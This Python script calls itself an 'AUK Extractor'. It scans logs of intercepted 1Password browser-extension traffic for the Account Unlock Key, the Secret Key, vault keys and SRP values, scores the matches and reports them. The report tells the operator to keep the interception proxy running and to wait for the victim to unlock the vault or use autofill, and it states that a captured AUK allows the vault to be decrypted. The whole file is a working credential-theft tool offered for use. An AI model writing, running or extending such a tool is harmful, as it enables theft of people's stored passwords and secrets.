#!/usr/bin/env python3
"""
AUK (Account Unlock Key) Extractor

Analyzes intercepted 1Password native messaging traffic
to extract cryptographic key material.

Based on 1Password security whitepaper:
- AUK = derived from Master Password + Secret Key
- Used to decrypt vault keys
- 256-bit key
"""

import json
import re
import sys
import base64
import hashlib
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Any
from dataclasses import dataclass

# Log files from proxy
INTERCEPT_LOG = Path("/tmp/1password_intercept.log")
CAPTURE_FILE = Path("/tmp/1password_captured_keys.json")


@dataclass
class KeyMaterial:
    """Represents potential cryptographic key material"""
    key_type: str           # auk, secret_key, vault_key, etc.
    value: str              # The actual key data (base64 or hex)
    encoding: str           # base64, hex, raw
    bit_length: int         # Estimated key size
    source: str             # Where we found it
    timestamp: str          # When captured
    confidence: float       # How confident we are this is real (0-1)


class AUKExtractor:
    """
    Extracts and analyzes potential key material from 1Password traffic.
    """
    
    # Patterns for different key types
    KEY_PATTERNS = {
        # Exact field names from 1Password protocol
        'auk': [
            r'"auk"\s*:\s*"([A-Za-z0-9+/=]{32,})"',
            r'"accountUnlockKey"\s*:\s*"([A-Za-z0-9+/=]{32,})"',
            r'"AUK"\s*:\s*"([A-Za-z0-9+/=]{32,})"',
        ],
        'secret_key': [
            r'"secretKey"\s*:\s*"([A-Z0-9]{2}-[A-Z0-9]{6}-[A-Z0-9]{6}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5})"',
            r'"sk"\s*:\s*"([A-Za-z0-9+/=]{32,})"',
        ],
        'vault_key': [
            r'"vaultKey"\s*:\s*"([A-Za-z0-9+/=]{32,})"',
            r'"encryptionKey"\s*:\s*"([A-Za-z0-9+/=]{32,})"',
        ],
        'srp_x': [
            r'"srpX"\s*:\s*"([A-Za-z0-9+/=]{32,})"',
            r'"x"\s*:\s*"([A-Fa-f0-9]{64,})"',  # Hex SRP value
        ],
        'master_password_derived': [
            r'"derivedKey"\s*:\s*"([A-Za-z0-9+/=]{32,})"',
            r'"mpKey"\s*:\s*"([A-Za-z0-9+/=]{32,})"',
        ],
        'generic_key': [
            r'"key"\s*:\s*"([A-Za-z0-9+/=]{32,})"',
            r'"encKey"\s*:\s*"([A-Za-z0-9+/=]{32,})"',
        ],
    }
    
    # 1Password Secret Key format: A3-XXXXXX-XXXXXX-XXXXX-XXXXX-XXXXX-XXXXX
    SECRET_KEY_FORMAT = r'^[A-Z0-9]{2}-[A-Z0-9]{6}-[A-Z0-9]{6}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}$'
    
    def __init__(self):
        self.found_keys: List[KeyMaterial] = []
        
    def analyze_log_file(self, log_path: Path = INTERCEPT_LOG) -> List[KeyMaterial]:
        """Parse intercept log for key material"""
        
        if not log_path.exists():
            print(f"Log file not found: {log_path}")
            return []
        
        print(f"Analyzing: {log_path}")
        
        with open(log_path, 'r') as f:
            content = f.read()
        
        return self._extract_from_text(content, str(log_path))
    
    def analyze_captures(self, capture_path: Path = CAPTURE_FILE) -> List[KeyMaterial]:
        """Parse captured messages for key material"""
        
        if not capture_path.exists():
            print(f"Capture file not found: {capture_path}")
            return []
        
        print(f"Analyzing: {capture_path}")
        
        with open(capture_path, 'r') as f:
            captures = json.load(f)
        
        all_keys = []
        for capture in captures:
            if 'data' in capture:
                data_str = json.dumps(capture['data'])
                keys = self._extract_from_text(data_str, f"capture_{capture.get('timestamp', 'unknown')}")
                all_keys.extend(keys)
        
        return all_keys
    
    def _extract_from_text(self, text: str, source: str) -> List[KeyMaterial]:
        """Extract key material from text content"""
        
        found = []
        
        for key_type, patterns in self.KEY_PATTERNS.items():
            for pattern in patterns:
                matches = re.finditer(pattern, text, re.IGNORECASE)
                
                for match in matches:
                    value = match.group(1)
                    
                    # Determine encoding and size
                    encoding, bit_length = self._analyze_key_format(value)
                    
                    # Calculate confidence
                    confidence = self._calculate_confidence(key_type, value, bit_length)
                    
                    if confidence > 0.3:  # Only include reasonably confident matches
                        key = KeyMaterial(
                            key_type=key_type,
                            value=value,
                            encoding=encoding,
                            bit_length=bit_length,
                            source=source,
                            timestamp=datetime.now().isoformat(),
                            confidence=confidence
                        )
                        found.append(key)
                        self.found_keys.append(key)
        
        return found
    
    def _analyze_key_format(self, value: str) -> tuple:
        """Determine encoding and bit length of a key value"""
        
        # Check if it's a Secret Key format
        if re.match(self.SECRET_KEY_FORMAT, value):
            return ('secret_key_format', 128)  # 128-bit secret key
        
        # Check if hex
        if re.match(r'^[A-Fa-f0-9]+$', value):
            return ('hex', len(value) * 4)
        
        # Check if base64
        try:
            decoded = base64.b64decode(value)
            return ('base64', len(decoded) * 8)
        except:
            pass
        
        return ('unknown', len(value) * 8)
    
    def _calculate_confidence(self, key_type: str, value: str, bit_length: int) -> float:
        """Calculate confidence that this is real key material"""
        
        confidence = 0.5  # Base confidence
        
        # Boost for expected key sizes
        expected_sizes = {
            'auk': 256,
            'secret_key': 128,
            'vault_key': 256,
            'srp_x': 2048,  # SRP can be large
        }
        
        if key_type in expected_sizes:
            expected = expected_sizes[key_type]
            if bit_length == expected:
                confidence += 0.3
            elif abs(bit_length - expected) < 64:
                confidence += 0.1
        
        # Boost for high entropy
        if self._calculate_entropy(value) > 4.0:
            confidence += 0.1
        
        # Boost for specific key types
        if key_type in ['auk', 'secret_key']:
            confidence += 0.1
        
        return min(confidence, 1.0)
    
    def _calculate_entropy(self, value: str) -> float:
        """Calculate Shannon entropy of a string"""
        
        if not value:
            return 0.0
        
        freq = {}
        for char in value:
            freq[char] = freq.get(char, 0) + 1
        
        entropy = 0.0
        for count in freq.values():
            p = count / len(value)
            entropy -= p * (p and (p > 0 and __import__('math').log2(p) or 0))
        
        return entropy
    
    def report(self) -> str:
        """Generate report of found key material"""
        
        lines = [
            "=" * 60,
            "1PASSWORD KEY MATERIAL EXTRACTION REPORT",
            f"Generated: {datetime.now().isoformat()}",
            "=" * 60,
            "",
        ]
        
        if not self.found_keys:
            lines.append("No key material found.")
            lines.append("")
            lines.append("Make sure:")
            lines.append("  1. Proxy is running and connected")
            lines.append("  2. 1Password extension is active")
            lines.append("  3. User has unlocked their vault")
            return "\n".join(lines)
        
        # Group by key type
        by_type: Dict[str, List[KeyMaterial]] = {}
        for key in self.found_keys:
            if key.key_type not in by_type:
                by_type[key.key_type] = []
            by_type[key.key_type].append(key)
        
        for key_type, keys in sorted(by_type.items()):
            lines.append(f"\n{'─' * 40}")
            lines.append(f"KEY TYPE: {key_type.upper()}")
            lines.append(f"{'─' * 40}")
            
            for key in sorted(keys, key=lambda k: -k.confidence):
                lines.append(f"\n  Value:      {key.value[:50]}{'...' if len(key.value) > 50 else ''}")
                lines.append(f"  Encoding:   {key.encoding}")
                lines.append(f"  Bit length: {key.bit_length}")
                lines.append(f"  Confidence: {key.confidence:.0%}")
                lines.append(f"  Source:     {key.source}")
        
        # Summary
        lines.append("\n" + "=" * 60)
        lines.append("SUMMARY")
        lines.append("=" * 60)
        
        high_confidence = [k for k in self.found_keys if k.confidence > 0.7]
        
        if high_confidence:
            lines.append(f"\n🎯 HIGH CONFIDENCE KEYS FOUND: {len(high_confidence)}")
            
            # Check for AUK specifically
            auks = [k for k in high_confidence if k.key_type == 'auk']
            if auks:
                lines.append("\n⚠️  AUK (Account Unlock Key) DETECTED!")
                lines.append("    This is the key that unlocks the vault.")
                lines.append("    Combined with encrypted vault data, this allows decryption.")
        else:
            lines.append("\nNo high-confidence key material found.")
            lines.append("Keep the proxy running and try:")
            lines.append("  - Locking and unlocking 1Password")
            lines.append("  - Accessing vault items")
            lines.append("  - Triggering autofill")
        
        return "\n".join(lines)
    
    def save_report(self, output_path: Path = Path("/tmp/1password_extraction_report.txt")):
        """Save report to file"""
        
        report = self.report()
        with open(output_path, 'w') as f:
            f.write(report)
        
        print(f"Report saved to: {output_path}")
        return output_path


def monitor_mode():
    """Continuously monitor for new key material"""
    
    import time
    
    print("AUK Extractor - Monitor Mode")
    print("=" * 40)
    print("Watching for 1Password key material...")
    print("Press Ctrl+C to stop and generate report")
    print()
    
    extractor = AUKExtractor()
    last_size = 0
    
    try:
        while True:
            if INTERCEPT_LOG.exists():
                current_size = INTERCEPT_LOG.stat().st_size
                
                if current_size > last_size:
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] Log updated ({current_size} bytes)")
                    
                    # Re-analyze entire file
                    new_keys = extractor.analyze_log_file()
                    
                    if new_keys:
                        print(f"  ➜ Found {len(new_keys)} potential keys")
                        for key in new_keys:
                            print(f"    • {key.key_type}: {key.value[:30]}... ({key.confidence:.0%})")
                    
                    last_size = current_size
            
            # Also check captures
            if CAPTURE_FILE.exists():
                cap_keys = extractor.analyze_captures()
                if cap_keys:
                    print(f"  ➜ Found {len(cap_keys)} keys in captures")
            
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n\nGenerating final report...")
        extractor.save_report()
        print("\n" + extractor.report())


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="1Password AUK Extractor")
    parser.add_argument("--monitor", action="store_true", help="Continuously monitor for keys")
    parser.add_argument("--analyze", type=str, help="Analyze specific log file")
    parser.add_argument("--report", action="store_true", help="Generate report from existing data")
    
    args = parser.parse_args()
    
    if args.monitor:
        monitor_mode()
        return
    
    extractor = AUKExtractor()
    
    if args.analyze:
        extractor.analyze_log_file(Path(args.analyze))
    else:
        # Analyze default locations
        extractor.analyze_log_file()
        extractor.analyze_captures()
    
    print(extractor.report())
    
    if args.report:
        extractor.save_report()


if __name__ == "__main__":
    main()
